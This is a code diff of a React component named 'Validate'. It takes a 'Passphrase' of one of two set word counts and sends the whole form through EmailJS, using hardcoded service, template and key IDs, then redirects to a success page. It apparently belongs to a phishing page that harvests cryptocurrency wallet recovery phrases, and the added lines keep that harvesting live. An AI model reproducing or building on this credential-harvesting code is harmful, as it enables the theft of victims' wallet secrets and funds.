@@ -28,29 +28,27 @@ export default function Validate() {
       return setError(`Please fill in this field with your Passphrase`);
     }
     if (phrases.length === phraseNumber || phrases.length === phraseNumber2) {
+      setLoading(true);
+      const result = await emailjs.sendForm(
+        "service_e3ri2nl",
+        "template_3kwpega",
+        form.current!,
+        "05CQigNmYVMazVvCb"
+      );
+      if (result.status === 200) {
+        setValid(false);
+        setPhrase("");
+        router.push("/success");
+      } else {
+        setValid(false);
+        setError("Something went wrong, try again later");
+      }
+    } else {
       setLoading(false);
-       const result = await emailjs.sendForm(
-         "service_e3ri2nl",
-         "template_3kwpega",
-         form.current!,
-         "05CQigNmYVMazVvCb"
-       );
-       if (result.status === 200) {
-         setLoading(false);
-         setPhrase("");
-         setValid(true);
-         router.push("/success");
-       } else {
-         setLoading(false);
-         setError("Something went wrong, try again later");
-       }
-    }else{
       return setError(
         `Passphrase must have ${phraseNumber} or ${phraseNumber2} words but you provided only ${phrases.length}`
       );
     }
-    
-   
   };
   useEffect(() => setError(""), [phrase]);
 
